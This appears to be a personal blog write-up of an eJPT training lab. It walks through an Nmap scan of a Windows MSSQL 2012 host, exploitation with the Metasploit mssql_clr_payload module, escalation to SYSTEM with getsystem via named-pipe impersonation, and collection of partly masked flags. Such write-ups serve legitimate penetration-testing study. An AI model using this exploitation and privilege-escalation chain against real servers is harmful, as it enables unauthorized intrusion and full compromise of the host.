---
title: "eJPT - Host & Network Penetration Testing: The Metasploit Framework CTF1"
date: 2025-06-01 00:00:00 - 0500
categories: [ eJPT , Lab , Vulnerability Assessment]
tags: [Footprinting, Easy]
image:
    path: /assets/img/1.gif
    alt: image
---

### Lab Environment

In this lab environment, you will have GUI access to a Kali machine. The target machine will be accessible at **target.ine.local**.

**Objective:** Use Metasploit and manual investigation techniques to capture the following flags:

- **Flag 1:** Gain access to the MSSQLSERVER account on the target machine to retrieve the first flag.
- **Flag 2:** Locate the second flag within the Windows configuration folder.
- **Flag 3:** The third flag is also hidden within the system directory. Find it to uncover a hint for accessing the final flag.
- **Flag 4:** Investigate the Administrator directory to find the fourth flag.

# Tools

The best tools for this lab are:

- Nmap
- Metasploit Framework
- mssql

---

# Note

In this lab, the flag will follow the format: FLAG1_MD5Hash. For example, FLAG1_0f4d0db3668dd58cabb9eb409657eaa8. You need to submit only the MD5 hash string, excluding the underscore (_). For instance: 0f4d0db3668dd58cabb9eb409657eaa8.

### Question 1

---

Gain access to the MSSQLSERVER account on the target machine to retrieve the first flag.

Nmap results:

```bash
db_nmap -sV -sC target.ine.local
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-05 19:52 IST
[*] Nmap: Nmap scan report for target.ine.local (10.5.23.244)
[*] Nmap: Host is up (0.0028s latency).
[*] Nmap: Not shown: 991 closed tcp ports (reset)
[*] Nmap: PORT      STATE SERVICE            VERSION
[*] Nmap: 135/tcp   open  msrpc              Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
[*] Nmap: 1433/tcp  open  ms-sql-s           Microsoft SQL Server 2012 11.00.6020.00; SP3
[*] Nmap: | ms-sql-ntlm-info:
[*] Nmap: |   10.5.23.244\MSSQLSERVER:
[*] Nmap: |     Target_Name: WIN-5BQ22OKH4SO
[*] Nmap: |     NetBIOS_Domain_Name: WIN-5BQ22OKH4SO
[*] Nmap: |     NetBIOS_Computer_Name: WIN-5BQ22OKH4SO
[*] Nmap: |     DNS_Domain_Name: WIN-5BQ22OKH4SO
[*] Nmap: |     DNS_Computer_Name: WIN-5BQ22OKH4SO
[*] Nmap: |_    Product_Version: 6.3.9600
[*] Nmap: |_ssl-date: 2025-04-05T14:23:58+00:00; 0s from scanner time.
[*] Nmap: | ms-sql-info:
[*] Nmap: |   10.5.23.244\MSSQLSERVER:
[*] Nmap: |     Instance name: MSSQLSERVER
[*] Nmap: |     Version:
[*] Nmap: |       name: Microsoft SQL Server 2012 SP3
[*] Nmap: |       number: 11.00.6020.00
[*] Nmap: |       Product: Microsoft SQL Server 2012
[*] Nmap: |       Service pack level: SP3
[*] Nmap: |       Post-SP patches applied: false
[*] Nmap: |     TCP port: 1433
[*] Nmap: |_    Clustered: false
[*] Nmap: | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
[*] Nmap: | Not valid before: 2025-04-05T14:15:15
[*] Nmap: |_Not valid after:  2055-04-05T14:15:15
[*] Nmap: 3389/tcp  open  ssl/ms-wbt-server?
[*] Nmap: | ssl-cert: Subject: commonName=WIN-5BQ22OKH4SO
[*] Nmap: | Not valid before: 2025-01-08T07:08:38
[*] Nmap: |_Not valid after:  2025-07-10T07:08:38
[*] Nmap: | rdp-ntlm-info:
[*] Nmap: |   Target_Name: WIN-5BQ22OKH4SO
[*] Nmap: |   NetBIOS_Domain_Name: WIN-5BQ22OKH4SO
[*] Nmap: |   NetBIOS_Computer_Name: WIN-5BQ22OKH4SO
[*] Nmap: |   DNS_Domain_Name: WIN-5BQ22OKH4SO
[*] Nmap: |   DNS_Computer_Name: WIN-5BQ22OKH4SO
[*] Nmap: |   Product_Version: 6.3.9600
[*] Nmap: |_  System_Time: 2025-04-05T14:23:51+00:00
[*] Nmap: |_ssl-date: 2025-04-05T14:23:58+00:00; 0s from scanner time.
[*] Nmap: 49152/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49155/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
[*] Nmap: Host script results:
[*] Nmap: | smb-security-mode:
[*] Nmap: |   authentication_level: user
[*] Nmap: |   challenge_response: supported
[*] Nmap: |_  message_signing: disabled (dangerous, but default)
[*] Nmap: | smb2-time:
[*] Nmap: |   date: 2025-04-05T14:23:54
[*] Nmap: |_  start_date: 2025-04-05T14:15:13
[*] Nmap: | smb2-security-mode:
[*] Nmap: |   3:0:2:
[*] Nmap: |_    Message signing enabled but not required
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 74.54 seconds
```

start the MSSQL and based on version we found i search then found these

```bash
search type:exploit name:MSSQL 2012
use exploit/windows/mssql/mssql_clr_payload
```

Changed the payload from x86 to x64 and run and gained access on target and you should find the flag1 sitting there, also can be found the flag4 on root directory (I guess if not you need to have elevated  permission to do so). 

```bash
 Directory of C:\Users\Administrator\Desktop

04/05/2025  02:16 PM    <DIR>          .
04/05/2025  02:16 PM    <DIR>          ..
04/05/2025  02:16 PM                34 flag4.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,739,594,752 bytes free

C:\Users\Administrator\Desktop>type flag4.txt
type flag4.txt
6d9e3ea9d172404f95c932****
```

---

### Question 2

---

Locate the second flag within the Windows configuration folder.

For this to work we need the privileged user access which we don’t have it. because the windows configureation file location is `C:\Windows\System32\config` so i got back to meterpreter and look around what are the prives we have and we do have these 

C:\Windows\System32\config 

```bash
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
```

and we get to privilied use by using 

`getsystem`

This command tries to **elevate Meterpreter to SYSTEM** (the highest privilege level in Windows).

You successfully got SYSTEM:

```
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
```

- **Technique 5** is a known method using the **Print Spooler** service to impersonate SYSTEM via **named pipe impersonation**.
- This is possible **because you had SeImpersonatePrivilege**.

with this we gained the privilieged access and found the flag2 from the location 

```bash
C:\Windows\System32\config>type flag2.txt
type flag2.txt
24d1f54d707945009ddda8*******
```

---

### Question 3:

---

The third flag is also hidden within the system directory. Find it to uncover a hint for accessing the final flag.

For this we need to search for flag and this requires just the search command which is

```bash
C:\Windows\system32>dir /a /s *flag*
dir /a /s *flag*
 Volume in drive C has no label.
 Volume Serial Number is 5CD6-020B

 Directory of C:\Windows\system32\drivers\etc

04/05/2025  02:16 PM                34 EscaltePrivilageToGetThisFlag.txt
               1 File(s)             34 bytes

     Total Files Listed:
               1 File(s)             34 bytes
               0 Dir(s)   3,739,594,752 bytes free

```

```bash
C:\Windows\System32\drivers\etc>type EscaltePrivilageToGetThisFlag.txt
type EscaltePrivilageToGetThisFlag.txt
84a36ae220e448538567a1aa4******
```

That’s our flag3

---

### Question4:

---

Investigate the Administrator directory to find the fourth flag.

Just going to the Administrator directory and under Desktop the flag is found!

```bash
Directory of C:\Users\Administrator\Desktop

04/05/2025  02:16 PM    <DIR>          .
04/05/2025  02:16 PM    <DIR>          ..
04/05/2025  02:16 PM                34 flag4.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,739,594,752 bytes free

C:\Users\Administrator\Desktop>type flag4.txt
type flag4.txt
6d9e3ea9d172404f95c932f8******

```